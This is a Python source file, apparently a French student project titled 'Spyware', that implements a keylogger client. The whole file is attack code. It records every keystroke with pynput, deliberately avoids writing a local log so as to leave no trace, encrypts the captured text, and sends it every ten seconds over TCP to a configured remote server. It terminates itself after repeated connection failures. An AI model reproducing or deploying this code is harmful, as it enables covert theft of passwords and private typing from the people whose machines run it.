
# Bibliothèque importée

import subprocess
from env import *
import argparse
import socket
import time
import threading
import os
import re
from pynput.keyboard import Listener
from chiffrement import *

# déclaration variable globale
TXT_GLOB = ""


def argument():

    """
            Cette fonction utilise le module argparse pour définir et analyser des arguments de ligne de commande
            pour un programme le projet Spyware.
            :return: L'argument

    """

    p = argparse.ArgumentParser(description='Projet Python - Spyware')
    p.add_argument('-l', '--listen', type=int, help="se met en écoute sur le port TCP saisi par "
                                                    "l'utilisateur et attend les données du spyware UP")
    args = p.parse_args()
    return args


def pav_num():

    """

    Cette fonction permet de récupérer les codes de touches du pavé numérique puis les associés avec la valeur
    correspondante. Cette fonction a été créer pour résoudre les problèmes de traduction sur le pavé numérique.
    :return: La valeur associée dans le dictionnaire.

    """

    touche = {

        "<96>": "0",
        "<97>": "1",
        "<98>": "2",
        "<99>": "3",
        "<100>": "4",
        "<101>": "5",
        "<102>": "6",
        "<103>": "7",
        "<104>": "8",
        "<105>": "9",
        "<110>": "."
    }
    return touche


def kill_all():
    """
    Permet d'arrêter instantanément le script sans opération de nettoyage.
    :return: Rien
    """
    pid = os.getpid()
    os.kill(pid, 9)


def parse(srt):

    """
    Cette fonction prend en paramètre un caractère afin de l'analyser.
    Cela permet de remplacer des commandes clavier en une commande lisible.
    :param srt: Prend en paramètre un caractère.
    :return: Le caractère corrigé.

    """

    pattern = r'<\d+>'
    new_str = srt.replace("'", "")
    new_str = new_str.replace("Key.space", " ")
    new_str = new_str.replace("Key.backspace", "<-")
    new_str = new_str.replace("Key.enter", "\n")
    new_str = new_str.replace("Key.shift_r", " <shift> ")
    new_str = new_str.replace("Key.ctrl_l", " <ctrl> ")
    new_str = new_str.replace("Key.alt_gr", " <alt_gr> ")
    new_str = new_str.replace("Key.cmd", " <CMD> ")
    new_str = new_str.replace("Key.shift_l", " <shift> ")
    if re.match(pattern, new_str):
        pav_num_str = pav_num()
        new_str = pav_num_str.get(new_str, "-1")
    return new_str


def kpr(key):

    """
    Cette fonction est utilisée dès qu'une touche clavier est pressée.
    Elle est ensuite analysée par la fonction Parse
    :param key: La commande de la touche pressée
    :return: rien
    """
    global TXT_GLOB
    # with open("keylog.txt", "a") as f: ## pas de fichier ca laisse une trace c'est nul
    # f.write(parse(str(key)))m^ùp$=
    TXT_GLOB += parse(str(key))


def scan_socket(port):

    """
    Cette fonction créée un objet socket avec l'IP4 et le type.
    Elle attend un temps de réponse et vérifie la connection.
    Si elle réussit, elle envoie un message de connection.
    Sinon, elle renvoie un message d'échec et stop le script.

    :param port:  Récupère le numéro de port
    :return: rien
    """
    try:
        rsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP

        rsocket.settimeout(1)  # définition du temps d'attente de la réponse

        if port:
            rsocket.connect((SRV, port))
        else:
            rsocket.connect((SRV, PORT))

        print("Connection établie ")
        time_buffer = 0
    except TimeoutError:
        print("Echec de connection")



def keylogger():

    """
    Fonction qui permet de vérifier qu'une touche a bien été presser et relâcher.
    Permet d'enregistrer les touches du clavier.
    :return: Rien
    """
    with Listener(on_press=kpr) as listener:
        listener.join()


def send(data, port):

    """
    Cette fonction permet d'envoyer les données du client vers le serveur.
    Lors de l'envoi, elle chiffre les données grâce à la fonction Chiffrement.
    S'il y a un échec, elle arrête le script grâce à la fonction kill_all().
    :param data: Argument les données à envoyer.
    :param port: Port de la connection.
    :return:
    """

    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        if port:
            client_socket.connect((SRV, port))
        else:
            client_socket.connect((SRV, PORT))

        client_socket.send(chiffrement(data))  # envoi
        client_socket.close()
    except Exception as e:
        print(f"Erreur lors de l'envoi : {e}")
        #kill_all()



def commands(cmd, port):

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    client_socket.connect((SRV, port))

    client_socket.send(cmd.encode('utf-8'))  # envoi

    client_socket.close()
 

def chrono():

    """
    Cette fonction est un chronomètre effectuant plusieurs actions.
    Elle prend un argument avec la fonction argument.
    Puis dans une boucle infinie, elle vérifie la connection entre le client et le serveur.
    Elle envoie avec la fonction send dans un Thread le contenu de la variable globale `TXT_GLOB`
    toutes les 10 secondes au serveur.
    Elle met fin à la connection au bout de 600 secondes.
    En cas d'échec elle stop le script
    :return: Rien
    """
    time_buffer = 0
    arg = argument()
    global TXT_GLOB
    while True:
        seconds = 0
        while True:
            try:

                print(f"Secondes : {seconds}")
                seconds += 1
                scan_socket(arg.listen)  # le problème de merde !!!
                time.sleep(1)

                if seconds % 10 == 0:
                    send_t = threading.Thread(target=send(TXT_GLOB, arg.listen))
                    send_t.start()
                    # print(TXT_GLOB)
                    TXT_GLOB = ""
                    time_buffer = 0
                if seconds == 600:
                    return 0
            except Exception as e:
                print(f"Erreur lors de l'envoi : {e}")
                time_buffer = time_buffer + 1
            if time_buffer == 3 :
                kill_all()


if __name__ == '__main__':

    chrono_t = threading.Thread(target=chrono)

    chrono_t.start()

    keylog_t = threading.Thread(target=keylogger)

    keylog_t.start()
